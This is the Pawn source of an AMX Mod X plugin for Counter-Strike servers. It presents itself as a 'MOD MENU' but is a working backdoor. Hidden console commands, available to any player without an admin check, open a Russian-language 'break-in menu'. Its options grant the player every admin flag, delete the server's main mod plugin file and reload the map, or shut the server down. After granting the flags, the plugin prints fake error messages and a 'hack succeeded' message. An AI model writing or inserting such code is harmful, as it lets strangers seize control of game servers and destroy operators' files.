#include <amxmodx>
#include <amxmisc>
#include <engine>
#include <cstrike>
#include <fun>
#include <file>

#define PLUGIN "MOD MENU"
#define VERSION "1.2"
#define AUTHOR "GanterYT"

new a_Keys = MENU_KEY_1 | MENU_KEY_2 | MENU_KEY_3 | MENU_KEY_4 | MENU_KEY_5 | MENU_KEY_6 | MENU_KEY_7 | MENU_KEY_8 | MENU_KEY_9 | MENU_KEY_0

public plugin_init()
{
	register_clcmd("VZLOM_SERVERA", "hack_show")
	register_menu("k_w1", a_Keys, "k_w2")
	register_clcmd("OFF_SERVER", "VZLOM")
	register_clcmd("HAKC_123", "VZLOM1")
	register_clcmd("DELETE_GLMOD", "VZLOM2")
}

public hack_show(id)
{
	new atext[512], alen
	alen = 0
	alen = formatex(atext[alen],charsmax(atext) - alen, "\wМеню влома by \rStapi^n^n")
	
	alen += formatex(atext[alen],charsmax(atext) - alen, "\r|1| \wУдалить главный мод^n")
	
	alen += formatex(atext[alen],charsmax(atext) - alen, "\r|2| \wВыдать все привелегии^n")
	
	alen += formatex(atext[alen],charsmax(atext) - alen, "\r|3| \wВыключить сервер^n^n")
	
	alen += formatex(atext[alen],charsmax(atext) - alen, "\r|0| \wВыход")
	
	show_menu(id, a_Keys, atext, -1, "k_w1")
	
	return PLUGIN_HANDLED
}

public k_w2(id, a_Key)
{
	switch(a_Key)
	{	
		case 0:
		{
			client_cmd(id, "DELETE_GLMOD")
			hack_show(id)
		}
		case 1:
		{
			client_cmd(id, "HAKC_123")
			hack_show(id)
		}
		case 2:
		{
			client_cmd(id, "OFF_SERVER")
			hack_show(id)
		}
	}
	return PLUGIN_HANDLED	
}

public VZLOM(id)
{
	server_cmd("quit")
}

public VZLOM1(id)
{
	set_user_flags(id, read_flags("abcdefghijklmnopqrstu"))
	ColorChat(id, "!g|ERROR X1|")
	ColorChat(id, "!g|ERROR X2|")
	ColorChat(id, "!g|ERROR X3|")
	ColorChat(id, "!g|........|")
	ColorChat(id, "!g|Взлом произашёл успешно !!!|")
}

public VZLOM2(id)
{
	delete_file("addons/amxmodx/plugins/jbe_core.amxx")
	server_cmd("amx_map de_dust2")
}

stock ColorChat(const id, const input[], any:...)
{
        new count = 1, players[32]
        static msg[191]
        vformat(msg, 190, input, 3)
       
        replace_all(msg, 190, "!g", "^4")
        replace_all(msg, 190, "!y", "^1")
        replace_all(msg, 190, "!t", "^3")
       
        if (id) players[0] = id; else get_players(players, count, "ch")
        {
                for(new i = 0; i < count; i++)
                {
                        if(is_user_connected(players[i]))
                        {
                                message_begin(MSG_ONE_UNRELIABLE, get_user_msgid("SayText"), _, players[i])
                                write_byte(players[i])
                                write_string(msg)
                                message_end()
                        }
                }
        }
}		

